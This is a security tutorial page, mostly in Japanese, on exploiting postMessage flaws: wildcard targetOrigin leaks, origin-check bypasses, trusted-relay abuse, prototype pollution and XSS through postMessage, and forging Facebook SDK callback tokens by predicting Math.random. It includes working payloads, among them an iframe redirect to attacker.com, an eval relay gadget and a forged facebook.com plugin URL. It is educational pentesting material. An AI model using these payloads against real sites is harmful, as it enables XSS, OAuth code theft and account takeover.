# PostMessage の脆弱性

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** の送信

**PostMessage** はメッセージを送信するために次の関数を使用します:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\  
**第二のシナリオ** では、**message はそのドメインにのみ送信されます**（Window オブジェクトの origin が異なっていても）。\  
もし **wildcard** が使われている場合、**messages は任意のドメインに送信される可能性があり**、Window オブジェクトの origin に送信されます。

### **targetOrigin** における iframe と wildcard の攻撃

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\  
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** は、JS が **`postMessages` を受信することを期待する** 関数を宣言するために使用される関数です。\
以下のようなコードが使用されます:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **最初に** that the code is doing is **checking the origin**. This is terribly **重要** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 列挙

現在のページで **event listeners** を見つけるには、次の方法があります:

- **JSコードを検索**して `window.addEventListener` と `$(window).on` を探す（_JQuery version_）
- デベロッパーツールのコンソールで **実行**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- ブラウザのデベロッパーツールで **Elements --> Event Listeners** に移動する

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) や [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) のような **browser extension** を使う。これらの拡張は **すべてのメッセージをインターセプト**して表示してくれます。

### Originチェックのバイパス

- **`event.isTrusted`** 属性は genuine user actions のみで True を返すため、安全と見なされます。正しく実装されていれば回避は難しいですが、セキュリティチェックでの重要性は高いです。
- PostMessage の origin 検証で **`indexOf()`** を使うとバイパスされる可能性があります。例:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` の **`search()`** メソッドは文字列ではなく正規表現向けです。regexp 以外を渡すと暗黙的に正規表現に変換され、ドット (.) がワイルドカードになるため、特別に作ったドメインでのバイパスが可能になります。例えば:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** 関数も `search()` と同様に正規表現を処理します。正規表現が不適切に構成されているとバイパスされる可能性があります。
- **`escapeHtml`** 関数は入力をエスケープしてサニタイズすることを目的としていますが、新しいエスケープされたオブジェクトを作るのではなく既存オブジェクトのプロパティを上書きします。この挙動は悪用可能です。特に、オブジェクトの制御可能なプロパティが `hasOwnProperty` を認識しないように操作できる場合、`escapeHtml` は期待通りに動作しません。以下の例を参照してください:

- 期待される失敗:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- escape をバイパス:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

この脆弱性の文脈では、`File` オブジェクトが特に悪用されやすいです。`File` の読み取り専用の `name` プロパティはテンプレートで使われると `escapeHtml` によってサニタイズされないため、セキュリティリスクになります。

- JavaScript の `document.domain` プロパティはスクリプトによって短く設定でき、同じ親ドメイン内でより緩い same-origin ポリシーの適用を可能にします。

### Origin-only trust + trusted relays

受信側が **`event.origin`** のみをチェックしている（例えば `*.trusted.com` を信頼）場合、その origin 上に攻撃者がコントロール可能なパラメータを受け取り `postMessage` で指定された `targetOrigin`/`targetWindow` にエコーするような **"relay" ページ** を見つけられることがよくあります。例として、クエリパラメータを取り `{msg_type, access_token, ...}` を `opener`/`parent` に転送するマーケティング／分析用のガジェットがあります。対処手順は次の通りです:

- `opener` を持つ popup/iframe で victim ページを開き、そこでハンドラが登録されるようにする（多くのピクセルや SDK は `window.opener` が存在する場合のみリスナーをアタッチする）。
- 攻撃者の別ウィンドウを trusted origin 上の relay エンドポイントにナビゲートし、注入したいメッセージフィールド（message type、tokens、nonces）をクエリで設定する。
- メッセージが **trusted origin から来る** ため、origin-only の検証を通過し、victim のリスナーで特権的な動作（状態変更、API コール、DOM の書き換え）を引き起こせます。

実際に見られる悪用パターン:

- Analytics SDK（例: ピクセル／fbevents スタイル）は `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを受け取り、メッセージで渡されたトークンを使ってバックエンド API をコールし、リクエストボディに **`location.href` / `document.referrer`** を含めます。自分のトークンを渡せば、そのトークンで行われたリクエスト履歴／ログを読み取り、被害者ページの URL/referrer に含まれる OAuth コード／トークンを exfil できます。
- 任意のフィールドを `postMessage` に反映するリレーは、特権リスナーが期待するメッセージタイプを **spoof** することを許します。弱い入力検証と組み合わせれば、Graph/REST コール、機能のアンロック、または CSRF 相当のフローに到達できます。

ハンティングのコツ: `postMessage` リスナーで `event.origin` のみをチェックしているものを列挙し、次に **同一オリジンの HTML/JS エンドポイントで URL パラメータを `postMessage` 経由で転送するもの**（マーケティングプレビュー、ログインポップアップ、OAuth エラーページ）を探します。`window.open()` と `postMessage` を組み合わせて Origin チェックを回避します。

### e.origin == window.origin バイパス

sandboxed iframe を %%%%%% を使って埋め込む場合、iframe の origin が null に設定されることを理解しておくことが重要です。これは sandbox 属性とそのセキュリティ・機能への影響に関わります。

sandbox 属性に **`allow-popups`** を指定すると、iframe 内から開かれた popup ウィンドウは親の sandbox 制限を継承します。つまり、**`allow-popups-to-escape-sandbox`** 属性が含まれていない限り、popup ウィンドウの origin も同様に `null` に設定され、iframe の origin と一致します。

その結果、これらの条件下で popup が開かれ、iframe から popup に **`postMessage`** でメッセージが送信されると、送信側と受信側の両方の origin が `null` に設定されます。この状況では **`e.origin == window.origin`** が true（`null == null`）と評価されます。両者が同じ origin 値 `null` を共有しているためです。

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

スクリプトがリスンしているのと同じウィンドウからメッセージが来たかどうかをチェックすることは可能です（特に **Content Scripts from browser extensions** がメッセージが同じページから送られたかを確認する場合に興味深いです）：
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
メッセージの **`e.source`** を null に強制できます。方法は **iframe** を作成して **送信する** **postMessage** を発生させ、その **iframe** を **即座に削除する** ことです。

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

これらの攻撃を実行するには理想的には **被害者のウェブページを配置する** ことができ、`iframe` の中に入れられる必要があります。だが `X-Frame-Header` のようなヘッダはその **挙動** を **阻止** することがあります。\
そのようなシナリオでも、より目立つ（ステルス性の低い）攻撃を使うことができます。脆弱なウェブアプリケーションを新しいタブで開き、そこから通信することができます:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページをブロックして child iframe に送信されたメッセージを盗む

次のページでは、データ送信前に**blocking**した**main**ページによって**child iframe**に送信された**sensitive postmessage data**を盗み、子の**XSS in the child**を悪用して受信前にそのデータを**leak the data**する方法を示します:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe location を変更してメッセージを盗む

もし X-Frame-Header のないウェブページを iframe にでき、そのページが別の iframe を含んでいる場合、**change the location of that child iframe** が可能です。もしその iframe が **postmessage** を **wildcard** を使って受け取っているなら、攻撃者はその iframe の **origin** を自身が **controlled** するページに **change** してメッセージを **steal** できます:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage による Prototype Pollution および/または XSS

`postMessage` 経由で送られたデータが JS によって実行されるような状況では、**iframe** でその**page**を開き、`postMessage` を介してエクスプロイトを送って **prototype pollution/XSS** を **exploit** することができます。

いくつかの**very good explained XSS though `postMessage`**は次で見つかります: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

`iframe` への `postMessage` を通じて **Prototype Pollution and then XSS** を悪用するエクスプロイトの例:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
詳しくは**こちら**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) に関するページへのリンク
- [**XSS**](../xss-cross-site-scripting/index.html) に関するページへのリンク
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) に関するページへのリンク

### Trusted-origin allowlist は境界ではない

厳密な `event.origin` チェックが機能するのは、**trusted origin cannot run attacker JS** の場合だけです。権限のあるページがサードパーティの iframe を埋め込み、`event.origin === "https://partner.com"` が安全だと仮定している場合、`partner.com` 内の任意の XSS が親ページへの橋渡しになってしまいます:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
実際に観測された攻撃パターン:

1. **パートナー iframe の XSS を悪用して** relay gadget を設置し、任意の `postMessage` が trusted origin 内で code exec になるようにする:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **攻撃者ページから**, 乗っ取られた iframe に JS を送り、許可されたメッセージタイプを親フレームに転送させます。メッセージは `partner.com` から発信され、allowlist を通過し、安全でない方法で挿入される HTML を含んでいます:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. 親が攻撃者のHTMLを注入し、**親オリジンでのJS実行**（例: `facebook.com`）を許してしまう。これにより OAuth コードを盗んだり、完全なアカウント乗っ取りフローへピボットできる。

Key takeaways:

- **Partner origin isn't a boundary**: 信頼されたパートナー内の任意の XSS は、攻撃者が許可されたメッセージを送って `event.origin` チェックを回避することを可能にする。
- ハンドラが **render partner-controlled payloads**（例: 特定のメッセージ種類に対する `innerHTML`）を行う場合、パートナーの妥協は same-origin の DOM XSS になる。
- 広範な **message surface**（多数のタイプ、構造検証なし）は、パートナー iframe が妥協された際にピボット用のガジェットを増やす。

### Predicting **`Math.random()`** callback tokens in postMessage bridges

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Some SDKs expose a reinit path; in the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls for callback/iframe IDs, so solvers must skip intervening values).
- **Trusted-origin delivery via parameter pollution:** If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- **Trigger the sink:** Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth dialogs, arbiters, etc.) can be read.
- **Framing quirks help:** The chain requires framing. In some mobile webviews, `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can force permissive `frame-ancestors`, enabling the `window.name` side channel.

#### 最小限の偽造メッセージ例
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考資料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: postMessage の信頼を介した OAuth コードの exfiltration が Instagram ATO を招く](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random コールバック予測 → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
